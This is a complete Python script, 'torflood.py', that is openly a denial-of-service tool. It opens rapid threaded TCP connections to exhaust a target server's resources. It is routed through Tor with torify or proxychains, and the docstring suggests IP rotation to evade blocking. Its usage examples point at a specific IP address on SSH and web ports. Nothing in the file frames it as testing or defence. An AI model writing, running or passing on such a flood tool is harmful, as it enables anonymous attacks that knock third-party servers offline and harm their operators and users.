#!/usr/bin/env python3
"""
torflood.py — TCP connection flood through Tor. Use with torify.

Opens rapid TCP connections to exhaust server resources. Works through
torify/proxychains since it uses standard sockets (not raw packets).
Pair with ipchanger for IP rotation.

Usage:
  torify python3 torflood.py --target 104.236.68.226 --port 22 --threads 50
  torify python3 torflood.py --target 104.236.68.226 --port 22,80,443 --threads 100
"""

import argparse
import socket
import threading
import time
import signal
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

stop = False
lock = threading.Lock()
stats = {"connect": 0, "refused": 0, "timeout": 0, "error": 0, "total": 0}


def get_my_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(("api.ipify.org", 80))
        s.send(b"GET / HTTP/1.1\r\nHost: api.ipify.org\r\nConnection: close\r\n\r\n")
        data = s.recv(4096).decode()
        s.close()
        body = data.split("\r\n\r\n")[-1].strip()
        return body if body else "unknown"
    except Exception:
        return "unknown"


def tcp_connect(target, port, timeout=10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((target, port))
        latency = round((time.time() - t0) * 1000, 1)
        s.close()
        return "CONNECT", latency
    except ConnectionRefusedError:
        return "REFUSED", round((time.time() - t0) * 1000, 1)
    except socket.timeout:
        return "TIMEOUT", timeout * 1000
    except OSError as e:
        return f"ERROR:{e.errno}", round((time.time() - t0) * 1000, 1)
    finally:
        try:
            s.close()
        except Exception:
            pass


def flood_worker(target, ports, worker_id):
    global stop
    first = True
    while not stop:
        for port in ports:
            if stop:
                return
            if first:
                print(f"  [W{worker_id}] connecting {target}:{port}...", flush=True)
            result, latency = tcp_connect(target, port)
            if first:
                print(f"  [W{worker_id}] {result} {latency}ms", flush=True)
                first = False
            with lock:
                stats["total"] += 1
                if result == "CONNECT":
                    stats["connect"] += 1
                elif result == "REFUSED":
                    stats["refused"] += 1
                elif result == "TIMEOUT":
                    stats["timeout"] += 1
                else:
                    stats["error"] += 1


def reporter(target, ports, log_file):
    global stop
    last_total = 0
    ip_check_interval = 30
    last_ip_check = 0
    current_ip = "checking..."
    seq = 0

    while not stop:
        time.sleep(2)
        if stop:
            break
        seq += 1
        now = time.time()

        if now - last_ip_check > ip_check_interval or last_ip_check == 0:
            current_ip = get_my_ip()
            last_ip_check = now

        with lock:
            total = stats["total"]
            conn = stats["connect"]
            ref = stats["refused"]
            tout = stats["timeout"]
            err = stats["error"]

        rps = (total - last_total) / 2
        last_total = total

        ts = datetime.now().strftime("%H:%M:%S")
        line = (f"[{ts}] #{seq}  total={total}  rps={rps:.0f}  "
                f"connect={conn}  refused={ref}  timeout={tout}  "
                f"error={err}  IP={current_ip}")
        print(line, flush=True)
        if log_file:
            log_file.write(line + "\n")
            log_file.flush()


def main():
    global stop

    ap = argparse.ArgumentParser(description="TCP flood through Tor")
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", default="22")
    ap.add_argument("--threads", type=int, default=50)
    ap.add_argument("--log", default=None, help="Log file path")
    args = ap.parse_args()

    ports = [int(p) for p in args.port.split(",")]

    signal.signal(signal.SIGINT, lambda s, f: set_stop())

    def set_stop():
        global stop
        stop = True

    signal.signal(signal.SIGINT, lambda s, f: set_stop())

    log_file = None
    if args.log:
        log_file = open(args.log, "w")

    print(f"=" * 60)
    print(f"  TorFlood — TCP connection flood via Tor")
    print(f"  Target:  {args.target}")
    print(f"  Ports:   {ports}")
    print(f"  Threads: {args.threads}")
    print(f"  Ctrl+C to stop")
    print(f"=" * 60)

    header = (f"target={args.target} ports={ports} threads={args.threads} "
              f"started={datetime.now().isoformat()}")
    print(f"\n{header}\n")
    if log_file:
        log_file.write(header + "\n")

    print("Checking Tor IP...", flush=True)
    my_ip = get_my_ip()
    print(f"Current exit IP: {my_ip}\n", flush=True)
    if log_file:
        log_file.write(f"initial_ip={my_ip}\n\n")

    rep = threading.Thread(target=reporter, args=(args.target, ports, log_file),
                           daemon=True)
    rep.start()

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=flood_worker, args=(args.target, ports, i),
                             daemon=True)
        t.start()
        threads.append(t)

    try:
        while not stop:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop = True

    print(f"\n{'=' * 60}")
    print(f"  DONE")
    print(f"  Total: {stats['total']}  Connect: {stats['connect']}  "
          f"Refused: {stats['refused']}  Timeout: {stats['timeout']}  "
          f"Error: {stats['error']}")
    print(f"{'=' * 60}\n")

    if log_file:
        log_file.write(f"\nFINAL: total={stats['total']} connect={stats['connect']} "
                       f"refused={stats['refused']} timeout={stats['timeout']} "
                       f"error={stats['error']}\n")
        log_file.close()


if __name__ == "__main__":
    main()
